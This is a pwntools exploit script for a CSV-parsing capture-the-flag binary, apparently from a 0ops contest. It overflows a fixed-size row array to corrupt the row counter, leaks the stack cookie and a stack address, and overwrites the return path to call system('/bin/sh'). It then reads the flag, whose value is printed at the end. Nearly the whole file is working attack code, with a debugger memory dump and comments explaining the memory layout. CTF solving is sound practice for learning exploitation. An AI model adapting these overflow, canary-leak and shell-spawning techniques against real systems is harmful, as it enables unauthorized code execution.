#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# CSVDocument::addRow
# b *0x805E398

# utf8 encode
# b *0x0805F712

# ret from process
# b *0x805DAB4

b *0x805d974
continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or ''
    port = int(args.PORT or 0)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]
has_space       = lambda data: any(c in {0x20, 0x09, 0x0a, 0x0b, 0x0c, 0x0d} for c in data)
is_scanf_safe   = lambda data: not has_space(data)
is_stream_safe  = lambda data: not has_space(data)
is_cin_safe     = lambda data: not has_space(data)
is_fgets_safe   = lambda data: (b'\n' not in data)
is_gets_safe    = lambda data: is_fgets_safe(data)
is_getline_safe = lambda data: is_fgets_safe(data)


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


ru(b'Give me your CSV:')
sl(b'col1,col2,col3,col4,col5,col6,col7,col8,col9,col10,col11,col12,col13,col14,col15,col16')


"""
struct CSVRow // sizeof=0x44
{
    _DWORD data[16];
    int fields_num;
};

struct CSVDocument // sizeof=0x268
{
    struct CSVRow header;
    struct CSVRow csv_rows[8];
    int rows_cnt;
};
"""

# the goal is to overwrite rows_cnt to negative value, so we can add more rows than 8
# last CSVRow should have 17 columns, so the 17th column overwrites fields_num and 18th rows_cnt, making it negative
# the type of the last column should be NO, so that when we add a new row, atoi is called on it
# Important thing is to set the proper size for first data CSVRow so the printing logic will not crash:

"""
 for ( j = 0; ; ++j )
  {
    Count = CSVRow::getCount(inserted_row);
    if ( j >= Count )
      break;
    CSVRow::getField(&data_ptr, &this->header, j);
    v8 = &types[j];
    *v8 = CSVDocument::getHeaderType(this, data_ptr);
  }
  CSVRow::print(inserted_row, types);

"""

NO = b'"N\tO"'
sl(b','.join([NO]*16 + [b'2']*16 + [NO]))


"""
data[16]:
239:08e4│     0xffffc274 —▸ 0x807dc30 ◂— 0x4f4e /* 'NO' */
23a:08e8│     0xffffc278 —▸ 0x807df70 ◂— 0x8004f4e /* 'NO' */
23b:08ec│     0xffffc27c —▸ 0x807e5e0 ◂— 0x8004f4e /* 'NO' */
23c:08f0│     0xffffc280 —▸ 0x807e850 ◂— 0x8004f4e /* 'NO' */
23d:08f4│     0xffffc284 —▸ 0x807eb10 ◂— 0x8004f4e /* 'NO' */
23e:08f8│     0xffffc288 —▸ 0x807ede0 ◂— 0x8004f4e /* 'NO' */
23f:08fc│     0xffffc28c —▸ 0x807f0b0 ◂— 0x8004f4e /* 'NO' */
240:0900│     0xffffc290 —▸ 0x807f590 ◂— 0x8004f4e /* 'NO' */
241:0904│     0xffffc294 —▸ 0x807f810 ◂— 0x8004f4e /* 'NO' */
242:0908│     0xffffc298 —▸ 0x807fae0 ◂— 0x8004f4e /* 'NO' */
243:090c│     0xffffc29c —▸ 0x807fdb0 ◂— 0x8004f4e /* 'NO' */
244:0910│     0xffffc2a0 —▸ 0x8080490 ◂— 0x8004f4e /* 'NO' */
245:0914│     0xffffc2a4 —▸ 0x8080760 ◂— 0x8004f4e /* 'NO' */
246:0918│     0xffffc2a8 —▸ 0x8080a30 ◂— 0x8004f4e /* 'NO' */
247:091c│     0xffffc2ac —▸ 0x8080d00 ◂— 0x8004f4e /* 'NO' */
248:0920│     0xffffc2b0 —▸ 0x8080fc0 ◂— 0x4f4e /* 'NO' */

header:
249:0924│     0xffffc2b4 —▸ 0x807b7a0 ◂— 0x32 /* '2' */
24a:0928│     0xffffc2b8 —▸ 0x8081520 ◂— 0x32 /* '2' */
24b:092c│     0xffffc2bc —▸ 0x8081790 ◂— 0x32 /* '2' */
24c:0930│     0xffffc2c0 —▸ 0x8081a00 ◂— 0x32 /* '2' */
24d:0934│     0xffffc2c4 —▸ 0x8081c70 ◂— 0x32 /* '2' */
24e:0938│     0xffffc2c8 —▸ 0x8081ee0 ◂— 0x32 /* '2' */
24f:093c│     0xffffc2cc —▸ 0x8082150 ◂— 0x32 /* '2' */
250:0940│     0xffffc2d0 —▸ 0x80823c0 ◂— 0x32 /* '2' */
251:0944│     0xffffc2d4 —▸ 0x8082a40 ◂— 0x32 /* '2' */
252:0948│     0xffffc2d8 —▸ 0x8082cb0 ◂— 0x32 /* '2' */
253:094c│     0xffffc2dc —▸ 0x8082f20 ◂— 0x32 /* '2' */
254:0950│     0xffffc2e0 —▸ 0x8083190 ◂— 0x32 /* '2' */
255:0954│     0xffffc2e4 —▸ 0x8083400 ◂— 0x32 /* '2' */
256:0958│     0xffffc2e8 —▸ 0x8083670 ◂— 0x32 /* '2' */
257:095c│     0xffffc2ec —▸ 0x80838e0 ◂— 0x32 /* '2' */
258:0960│     0xffffc2f0 —▸ 0x8083b50 ◂— 0x32 /* '2' */
259:0964│     0xffffc2f4 —▸ 0x8083f40 ◂— 0x4f4e /* 'NO' */

row[0]:
25a:0968│     0xffffc2f8 —▸ 0x807dc30 ◂— 0x4f4e /* 'NO' */
25b:096c│     0xffffc2fc —▸ 0x807df70 ◂— 0x8004f4e /* 'NO' */
25c:0970│     0xffffc300 —▸ 0x807e5e0 ◂— 0x8004f4e /* 'NO' */
25d:0974│     0xffffc304 —▸ 0x807e850 ◂— 0x8004f4e /* 'NO' */
25e:0978│     0xffffc308 —▸ 0x807eb10 ◂— 0x8004f4e /* 'NO' */
25f:097c│     0xffffc30c —▸ 0x807ede0 ◂— 0x8004f4e /* 'NO' */
260:0980│     0xffffc310 —▸ 0x807f0b0 ◂— 0x8004f4e /* 'NO' */
261:0984│     0xffffc314 —▸ 0x807f590 ◂— 0x8004f4e /* 'NO' */
262:0988│     0xffffc318 —▸ 0x807f810 ◂— 0x8004f4e /* 'NO' */
263:098c│     0xffffc31c —▸ 0x807fae0 ◂— 0x8004f4e /* 'NO' */
264:0990│     0xffffc320 —▸ 0x807fdb0 ◂— 0x8004f4e /* 'NO' */
265:0994│     0xffffc324 —▸ 0x8080490 ◂— 0x8004f4e /* 'NO' */
266:0998│     0xffffc328 —▸ 0x8080760 ◂— 0x8004f4e /* 'NO' */
267:099c│     0xffffc32c —▸ 0x8080a30 ◂— 0x8004f4e /* 'NO' */
268:09a0│     0xffffc330 —▸ 0x8080d00 ◂— 0x8004f4e /* 'NO' */
269:09a4│     0xffffc334 —▸ 0x8080fc0 ◂— 0x4f4e /* 'NO' */
26a:09a8│     0xffffc338 ◂— 2
... ↓        15 skipped

"""

# 17th column has type NO, so we can easily add the last row with 17 columns

for i in range(6):
    sl(str(i).encode())

# overwrite row_cnt with value, so we can add last two rows "again"
# 19th column contains a stack cookie
sl(b','.join([str(i).encode()] * 16)+b',30,5')
sl(b'1,2,3')


ru(b'30,5,', drop=True)
leak = rl().strip().decode()
info(f'leak: {leak}')

vals = leak.split(',')
stack_cookie = int(vals[0])
stack_cookie = u32(p32(stack_cookie, sign=True), sign=True)
logleak(stack_cookie=stack_cookie)

stack_addr = int(vals[1])
stack_addr = u32(p32(stack_addr, sign=True), sign=True)
logleak(stack_addr=stack_addr)

binsh = stack_addr - 0x1f4
logleak(binsh=binsh)
system_call = 0x805DAD1

part1 = u32(b'/bin')
part2 = u32(b'/sh\x00')

payload = '/bin/sh,' + ','.join(['9'] * 15)
payload += f',19,-1,{stack_cookie}'
payload += f',0,1,2,3,4,5,6,{system_call},{binsh},{part1},{part2}'

sl(payload.encode())

sl()
sl()

sleep(3)
sl(b'cat flag')
ia()


# 0ops{45fed091-a3ce-4dd5-979f-5e2d15f2cb41}